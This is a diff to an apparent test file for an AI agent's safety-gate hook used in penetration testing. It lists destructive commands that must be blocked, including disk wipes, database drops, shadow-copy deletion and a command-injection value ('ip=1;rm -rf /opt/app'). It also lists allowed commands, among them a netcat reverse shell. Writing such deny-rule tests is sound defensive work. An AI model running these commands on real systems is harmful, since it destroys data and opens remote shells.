@@ -13,9 +13,23 @@ HOOK = ROOT / ".claude" / "hooks" / "safety_gate.py"
 # Must be DENIED: irreversible destruction / mass exfil / DoS / money — never
 # needed to PROVE a vulnerability.
 BLOCKED_COMMANDS = [
-    "rm -rf target_dir",
+    "rm -rf /",
+    "rm -rf ~",
+    "rm -rf /etc",
+    "rm -rf '/'",
+    # destructive rm SHIPPED TO A TARGET (rm co-located with a URL) — blocked at
+    # any path, because destroying target data/files is never a proof step:
+    "curl 'http://t.test/?c=rm -rf /app/data'",
+    "python tools/probe.py POST http://t.test/x --data 'ip=1;rm -rf /opt/app'",
     "mysql -e 'DROP DATABASE prod'",
     "mysql -e 'DROP TABLE users'",
+    # harm-as-purpose / secure-wipe destruction (never auto):
+    "vssadmin delete shadows /all /quiet",
+    "wbadmin delete catalog -quiet",
+    "shred -u -z secret.key",
+    "wipefs -a /dev/sda",
+    "dd if=/dev/zero of=/dev/sda bs=1M",
+    "az group delete --name rg-prod --yes",
     "mysqldump -u root app_db > dump.sql",
     "redis-cli FLUSHALL",
     "mongosh --eval 'db.users.drop()'",
@@ -34,6 +48,12 @@ BLOCKED_COMMANDS = [
 # or sending an injection-differential probe is NOT destruction and must never be
 # blocked. If a new deny rule trips one of these, the rule is too broad.
 ALLOWED_COMMANDS = [
+    # repo-relative cleanup must pass through to the native ask/allow flow — the
+    # rm rule is narrowed to catastrophic targets, so local housekeeping is not
+    # hard-denied (the operator's normal-use guard).
+    "rm -rf tmp/build",
+    "rm -f runs/dvwa_20260613/evidence/cookies.txt",
+    "rm -rf node_modules",
     "Get-ChildItem -Force",
     "python tools/check_rules.py",
     "nc -e /bin/sh 10.0.0.1 4444",
